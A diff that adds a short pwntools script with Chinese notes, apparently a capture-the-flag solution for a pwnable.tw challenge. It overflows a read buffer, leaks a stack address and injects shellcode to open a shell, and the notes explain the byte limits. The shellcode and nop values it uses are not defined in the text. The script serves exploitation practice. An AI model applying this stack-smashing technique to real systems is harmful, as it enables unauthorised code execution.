@@ -1,0 +1,21 @@
+code:
+from pwn import *
+from myio import *
+
+r = remote('chall.pwnable.tw', 10000)
+r.send('B'*4 + 'A'*16 + p32(0x8048087))
+s = r.recvuntil('\x01\x00\x00\x00',timeout = 20)
+ebp_addr = binstr2hex(s[-8:-4])
+buf_addr = ebp_addr - 0x4
+print 'ebp_addr ' ,  hex(ebp_addr)
+print 'buf_addr ' ,  hex(buf_addr)
+r.send('A'*20 + p32(buf_addr+24) + shellcode + nop*3)
+r.interactive()
+
+利用system.read buffer overflow 可以改變ret addr
+不過read只收60個byte 須注意不能塞太大的shellcode
+所以準備了25byte的shellcode
+
+跳到system.write去顯示上一層的ebp
+算出read的buf offset
+加上base之後就可以把shellcode塞到stack去執行
